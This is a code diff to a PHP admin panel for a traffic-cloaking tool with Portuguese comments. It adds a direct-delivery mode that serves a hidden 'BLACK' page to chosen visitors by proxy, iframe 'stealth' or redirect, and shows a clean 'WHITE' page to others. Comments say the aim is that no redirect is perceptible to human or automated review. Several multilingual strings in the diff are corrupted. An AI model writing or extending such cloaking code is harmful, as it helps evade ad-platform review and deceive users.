@@ -281,6 +281,9 @@ if ($isLoggedIn && isset($_POST['ajax_action'])) {
                 'warmup_clicks' => max(0, (int)($_POST['warmup_clicks'] ?? 0)),
                 'allowed_countries' => $_POST['allowed_countries'] ?? '',
                 'verify_language' => $_POST['verify_language'] ?? 'auto',
+                // Pre-checagem JS (tela branca "Verificando..."). Por padrao DESLIGADA:
+                // a decisao e tomada no servidor e a entrega e direta (sem tela branca).
+                'js_precheck' => isset($_POST['js_precheck']) ? '1' : '0',
                 // Horario de Pausa
                 'schedule_enabled' => isset($_POST['schedule_enabled']) ? '1' : '0',
                 'schedule_start' => $_POST['schedule_start'] ?? '23:30',
@@ -314,7 +317,11 @@ if ($isLoggedIn && isset($_POST['ajax_action'])) {
                 $campaignData['slug'] = generateSlug($campaignData['name'], $existingSlugs);
             }
             
-            saveCampaign($campaignData);
+            if (!saveCampaign($campaignData)) {
+                jsonResponse([
+                    'error' => 'Nao foi possivel salvar a campanha. Verifique a permissao de escrita da pasta "data" (o servidor web precisa poder gravar nela).'
+                ], 500);
+            }
             // Gera/atualiza o tracker "live" usado pelo dominio da campanha
             commanderWriteLiveTracker($campaignData);
             jsonResponse(['success' => true, 'campaign' => $campaignData]);
@@ -828,6 +835,8 @@ function generateTrackerCode($campaign) {
     $whiteMethod = $campaign['white_method'] ?? 'redirect';
     $blackMethod = $campaign['black_method'] ?? 'proxy';
     $verifyLanguage = $campaign['verify_language'] ?? 'auto';
+    // Pre-checagem JS: '0' (padrao) = decide no servidor e entrega direto (sem tela branca)
+    $jsPrecheck = !empty($campaign['js_precheck']) && $campaign['js_precheck'] !== '0' ? '1' : '0';
     
     $code = <<<'TRACKER_CODE'
 <?php
@@ -858,6 +867,12 @@ $BLACK_URL = '{{BLACK_URL}}';
 $WHITE_METHOD = '{{WHITE_METHOD}}';
 $BLACK_METHOD = '{{BLACK_METHOD}}';
 $VERIFY_LANGUAGE = '{{VERIFY_LANGUAGE}}';
+// Pre-checagem JS (tela branca "Verificando..."):
+//   false (padrao) = a decisao e tomada no servidor (FASE 1) e a BLACK e entregue
+//                    imediatamente pelo metodo configurado, SEM tela branca intermediaria.
+//                    Nenhum redirecionamento perceptivel e exposto ao visitante/revisor.
+//   true           = mostra a tela "Verificando..." e coleta fingerprints JS antes de decidir.
+$JS_PRECHECK = ('{{JS_PRECHECK}}' === '1');
 $DEBUG_MODE = isset($_GET['debug']) && $_GET['debug'] === '1';
 
 // ==========================================
@@ -970,6 +985,46 @@ if (!isset($_POST['_detected'])) {
         exit;
     }
     
+    // ==========================================
+    // ENTREGA DIRETA (sem tela branca) - modo padrao
+    // ==========================================
+    // A decisao ja foi tomada no servidor (FASE 1) com IP/UA/pais/referer/UTM.
+    // Quando a pre-checagem JS esta DESLIGADA, entregamos a BLACK imediatamente
+    // pelo metodo configurado. Nao existe tela "Verificando..." nem etapa
+    // intermediaria, entao nao ha nenhum flash branco nem redirecionamento
+    // perceptivel para analise humana ou automatizada.
+    if (!$JS_PRECHECK) {
+        // Se a API nao respondeu de forma valida, vai para WHITE por seguranca.
+        if (!$initialResponse || !isset($initialResponse['action'])) {
+            header('Location: ' . $WHITE_URL);
+            exit;
+        }
+        // Aqui a acao e BLACK (o caso WHITE ja foi tratado e encerrado acima).
+        switch ($BLACK_METHOD) {
+            case 'proxy':
+                // Proxy reverso: conteudo servido na MESMA URL/dominio (sem redirect).
+                proxyRequest($BLACK_URL, true, 1, $WHITE_URL);
+                break;
+            case 'iframe':
+                // Stealth: codigo-fonte WHITE, visual BLACK.
+                proxyRequestStealth($WHITE_URL, $BLACK_URL);
+                break;
+            case 'shadow':
+                proxyRequestShadow($WHITE_URL, $BLACK_URL);
+                break;
+            case 'redirect':
+            default:
+                // 302 direto - instantaneo, tambem sem tela branca.
+                header('Location: ' . $BLACK_URL);
+                exit;
+        }
+        exit;
+    }
+
+    // ==========================================
+    // MODO PRE-CHECAGEM JS (opcional): tela "Verificando..." + fingerprints
+    // Só chega aqui quando $JS_PRECHECK = true.
+    // ==========================================
     // Se API diz BLACK (ou nao respondeu): mostra FASE 1 de verificacao
     $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') 
                   . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
@@ -1053,11 +1108,11 @@ html,body{width:100%;height:100%;background:#ffffff}
             "de":["Uberprufung der Sicherheit der Website","Dies dauert nur einige Sekunden..."],
             "it":["Verifica della sicurezza del sito","Ci vorranno solo pochi secondi..."],
             "nl":["Controleren of de site veilig is","Dit duurt slechts enkele seconden..."],
-            "ru":["Проверка безопасности сайта","Это займет всего несколько секунд..."],
+            "ru":["Проверка безопасности сайта","Это займет всего несколько секун��..."],
             "tr":["Sitenin guvenli olup olmadigi kontrol ediliyor","Bu yalnizca birkac saniye surecektir..."],
-            "ar":["جار التحقق من امان الموق��","لن يستغرق هذا سوى بضع ثوان..."],
+            "ar":["جار التحقق من امان الموق��","لن يستغرق هذا ���وى بضع ثوان..."],
             "ja":["サイトの安全性を確認しています","これには数秒しかかかりません..."],
-            "zh":["正在检查网站是否安全","这只需要几秒钟..."]
+            "zh":["正在检查网站是否安全","这只需要几��钟..."]
         };
         try{
             var lng=(navigator.language||(navigator.languages&&navigator.languages[0])||"en").toLowerCase().slice(0,2);
@@ -2306,6 +2361,7 @@ TRACKER_CODE;
     $code = str_replace('{{WHITE_METHOD}}', $whiteMethod, $code);
     $code = str_replace('{{BLACK_METHOD}}', $blackMethod, $code);
     $code = str_replace('{{VERIFY_LANGUAGE}}', $verifyLanguage, $code);
+    $code = str_replace('{{JS_PRECHECK}}', $jsPrecheck, $code);
     
     return $code;
 }
@@ -4730,6 +4786,17 @@ HTACCESS;
                         </select>
                         <small style="color:var(--muted);font-size:12px;">Texto da tela "Verificando se o site e seguro". Use "Automatico" para detectar o idioma de cada visitante.</small>
                     </div>
+
+                    <div class="form-group" style="margin-top:16px;margin-bottom:0;">
+                        <label style="display:flex;align-items:center;gap:8px;cursor:pointer;">
+                            <input type="checkbox" id="campaign-js-precheck" name="js_precheck" value="1" style="width:16px;height:16px;">
+                            <span><i class="fas fa-shield-halved" style="margin-right:6px;color:var(--primary);"></i>Mostrar tela "Verificando..." (pre-checagem JS)</span>
+                        </label>
+                        <small style="color:var(--muted);font-size:12px;display:block;margin-top:6px;">
+                            <strong style="color:var(--light);">Desligado (recomendado):</strong> a decisao e tomada no servidor e a pagina e entregue direto, sem tela branca e sem redirecionamento perceptivel.
+                            <strong style="color:var(--light);">Ligado:</strong> exibe a tela "Verificando..." e coleta fingerprints do navegador antes de decidir (camada extra, porem com flash branco).
+                        </small>
+                    </div>
                 </div>
 
                 <div style="border-top:1px solid var(--surface);padding-top:20px;margin-top:4px;">
@@ -6457,6 +6524,9 @@ function openCampaignModal(campaign = null) {
 
     // Idioma da tela de verificacao
     document.getElementById('campaign-verify-language').value = campaign?.verify_language || 'auto';
+
+    // Pre-checagem JS (tela "Verificando..."). Padrao: desligado (entrega direta, sem tela branca).
+    document.getElementById('campaign-js-precheck').checked = campaign?.js_precheck === '1' || campaign?.js_precheck === true;
 
     // Mostra cliques atuais e status de aquecimento
     const warmupClicks = parseInt(campaign?.warmup_clicks || 0);
